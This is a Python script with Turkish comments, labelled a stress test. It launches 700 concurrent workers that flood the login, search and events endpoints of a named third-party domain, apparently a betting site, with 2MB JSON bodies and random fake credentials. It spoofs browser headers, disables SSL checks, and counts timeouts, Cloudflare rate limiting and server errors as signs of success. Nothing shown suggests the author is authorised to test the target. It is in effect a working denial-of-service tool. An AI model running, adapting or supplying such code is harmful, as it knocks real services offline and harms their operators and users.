"""
2MB payload + /login stres testi
Hem bant genisligini hem CPU'yu ayni anda vurur
"""
import asyncio
import aiohttp
import time
import json
import os
import random
import string

# 2MB payload'i yukle
BIG_PAYLOAD_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "big_payload.json")

print("2MB payload yukleniyor...")
with open(BIG_PAYLOAD_PATH, "r", encoding="utf-8") as f:
    BIG_DATA = json.load(f)

PAYLOAD_SIZE_MB = len(json.dumps(BIG_DATA)) / (1024*1024)
print(f"Payload boyutu: {PAYLOAD_SIZE_MB:.2f} MB")

HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer unlogged",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin": "https://7xwon.com",
    "Referer": "https://7xwon.com/"
}

SEARCH_TERMS = ["Galatasaray","Fenerbahce","Besiktas","Barcelona","Real Madrid",
                "Liverpool","Chelsea","Bayern","Juventus","Manchester"]

def make_nonce():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

# 3 farkli mod:
# 1) /login + 2MB payload (max cpu+bant genisligi)
# 2) /search + 2MB (db sorgu + buyuk payload)
# 3) /main-events + 2MB (cok sayida cakisan buyuk istek)
ENDPOINTS = [
    {
        "name": "/login+2MB",
        "url": "https://api.7xwon.com/login",
        "body": lambda: {
            "username": f"user{random.randint(1,99999)}",
            "password": make_nonce(),
            "device": "web",
            "big_data": BIG_DATA,
            "_ts": int(time.time()*1000)
        },
        "workers": 300
    },
    {
        "name": "/search+2MB",
        "url": "https://api.7xwon.com/search",
        "body": lambda: {
            "search": random.choice(SEARCH_TERMS),
            "big_data": BIG_DATA,
            "_ts": int(time.time()*1000)
        },
        "workers": 200
    },
    {
        "name": "/main-events+2MB",
        "url": "https://api.7xwon.com/main-events",
        "body": lambda: {
            "type": 0, "odds": False, "s": 1,
            "big_data": BIG_DATA,
            "_nonce": make_nonce()
        },
        "workers": 200
    },
]

DURATION = 30

from collections import defaultdict
stats = defaultdict(lambda: {"total":0,"ok":0,"errors":defaultdict(int),"lats":[],"bytes_sent":0})
stop = asyncio.Event()

async def worker(session: aiohttp.ClientSession, ep: dict):
    name = ep["name"]
    url  = ep["url"]
    while not stop.is_set():
        body = ep["body"]()
        body_bytes = json.dumps(body).encode()
        t0 = time.perf_counter()
        try:
            async with session.post(
                url,
                data=body_bytes,
                headers=HEADERS,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as r:
                await r.read()
                lat = (time.perf_counter() - t0) * 1000
                stats[name]["total"] += 1
                stats[name]["lats"].append(lat)
                stats[name]["bytes_sent"] += len(body_bytes)
                if r.status in (200,201):
                    stats[name]["ok"] += 1
                else:
                    stats[name]["errors"][r.status] += 1
        except asyncio.TimeoutError:
            lat = (time.perf_counter() - t0) * 1000
            stats[name]["total"] += 1
            stats[name]["errors"]["TIMEOUT"] += 1
            stats[name]["lats"].append(lat)
        except Exception:
            lat = (time.perf_counter() - t0) * 1000
            stats[name]["total"] += 1
            stats[name]["errors"]["CONN_ERR"] += 1
            stats[name]["lats"].append(lat)

async def reporter():
    t0 = time.time()
    total_workers = sum(e["workers"] for e in ENDPOINTS)
    while not stop.is_set():
        await asyncio.sleep(5)
        el = time.time() - t0
        total_mb = sum(stats[e["name"]]["bytes_sent"] for e in ENDPOINTS) / (1024*1024)
        mbps = total_mb / max(el,1)
        print(f"\n{'='*74}")
        print(f"  Sure: {el:.0f}s / {DURATION}s  |  {total_workers} worker  |  Toplam: {total_mb:.0f} MB gonderildi ({mbps:.1f} MB/s)")
        print(f"{'='*74}")
        print(f"{'Endpoint':<22} {'Total':>6} {'OK':>5} {'HATA':>6} {'req/s':>6} {'Ort ms':>8} {'MB/s':>6}")
        print(f"{'-'*74}")
        for ep in ENDPOINTS:
            n = ep["name"]
            d = stats[n]
            tot = d["total"]; ok = d["ok"]; errs = tot - ok
            rps = tot / max(el,1)
            avg = sum(d["lats"][-100:])/len(d["lats"][-100:]) if d["lats"] else 0
            ep_mbps = d["bytes_sent"] / (1024*1024) / max(el,1)
            print(f"{n:<22} {tot:>6} {ok:>5} {errs:>6} {rps:>6.1f} {avg:>7.0f}ms {ep_mbps:>5.1f}")
            if d["errors"]:
                print(f"  Hatalar: {dict(d['errors'])}")

async def main():
    total_workers = sum(e["workers"] for e in ENDPOINTS)
    print(f"\n2MB PAYLOAD STRES TESTI: {total_workers} ESLEZAMANLI BAGLANTI")
    print(f"Her istek ~{PAYLOAD_SIZE_MB:.1f} MB  |  Sure: {DURATION}s")
    print(f"Beklenen bant genisligi: ~{total_workers * PAYLOAD_SIZE_MB * 0.3:.0f} MB/s (tahmini)\n")

    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = []
        for ep in ENDPOINTS:
            for _ in range(ep["workers"]):
                tasks.append(asyncio.create_task(worker(session, ep)))
        tasks.append(asyncio.create_task(reporter()))

        await asyncio.sleep(DURATION)
        stop.set()
        await asyncio.gather(*tasks, return_exceptions=True)

    total_mb = sum(stats[e["name"]]["bytes_sent"] for e in ENDPOINTS) / (1024*1024)
    print(f"\n{'='*74}")
    print(f"  FINAL RAPOR  |  Toplam {total_mb:.0f} MB gonderildi")
    print(f"{'='*74}")
    for ep in ENDPOINTS:
        n = ep["name"]
        d = stats[n]
        tot = d["total"]; ok = d["ok"]
        rps = tot / DURATION
        avg = sum(d["lats"])/len(d["lats"]) if d["lats"] else 0
        mb_sent = d["bytes_sent"]/(1024*1024)
        err_codes = dict(d["errors"])
        print(f"\n  {n}")
        print(f"    Toplam: {tot}  OK: {ok}  Hata: {tot-ok}  req/s: {rps:.1f}  Gecikme: {avg:.0f}ms  Gonderilen: {mb_sent:.0f}MB")
        if err_codes:
            print(f"    Hatalar: {err_codes}")
            if "TIMEOUT" in err_codes:
                print(f"    *** TIMEOUT! Sunucu isteklere yetisemiyor ***")
            if 429 in err_codes:
                print(f"    *** 429 RATE-LIMIT! Cloudflare devreye girdi ***")
            if any(isinstance(k,int) and k>=500 for k in err_codes):
                print(f"    *** 5xx SUNUCU HATASI! Cokme belirtisi ***")
            if "CONN_ERR" in err_codes:
                print(f"    *** BAGLANTI REDDEDILDI! Port/kuyruk tasti ***")

if __name__ == "__main__":
    asyncio.run(main())
